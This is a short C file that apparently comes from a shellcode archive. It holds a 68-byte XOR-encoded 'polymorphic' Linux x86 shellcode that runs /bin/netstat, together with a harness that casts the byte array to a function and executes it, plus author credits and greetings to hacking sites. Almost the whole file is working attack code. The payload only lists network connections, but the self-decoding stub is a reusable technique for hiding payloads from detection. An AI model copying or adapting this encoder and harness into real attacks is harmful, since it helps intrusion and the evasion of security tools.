/*
 * sys_execve("/bin/netstat", { "/bin/netstat", NULL }, NULL) 68 bytes polymorphic shellcode
 *
 * tesla_ (gandung@ppp.cylab.cmu.edu)
 */

/*
 * Tested in : 
 * - BackTrack 5 (linux-2.6.38-generic)
 * - Ubuntu 10.10 Maverick Meerkat (linux-2.6.38-generic)
 * - Ubuntu 11.04 Natty Narwhal
 * - Debian Squeeze 6.0.2 (linux-2.6.32-5-stable)
 */

#include <stdio.h>
#include <string.h>

char netstat[] = "\xeb\x0d\x5e\x31\xc9\xb1\x30\x80\x36\xb7"
		 "\x46\xe2\xfa\xeb\x05\xe8\xee\xff\xff\xff"
		 "\x86\x77\x86\x65\x34\x5b\xb6\x3f\xb3\x93"
		 "\xdf\xc4\xc3\xd6\xc3\xdf\x98\xd9\xd2\xc3"
		 "\xdf\x98\xd5\xde\xd9\x3e\x54\x34\x5b\xb6"
		 "\x3f\xb3\x93\xe7\xe5\xe4\x07\xbc\x3e\x56"
		 "\x7a\x37\x86\x77\x07\xb6\x7a\x37";

int main(void) {
  int net_len = strlen(netstat);
  printf("[+] Using key mutation engine : 0xb7\n");
  printf("[+] Length of this shellcode is : %d bytes\n\n", net_len);
  (*(void(*)())netstat)();
  return 0;
}

/* devilzc0de.org, hacker-newbie.org, sdf.lonestar.org, 1337day.com */		 

		  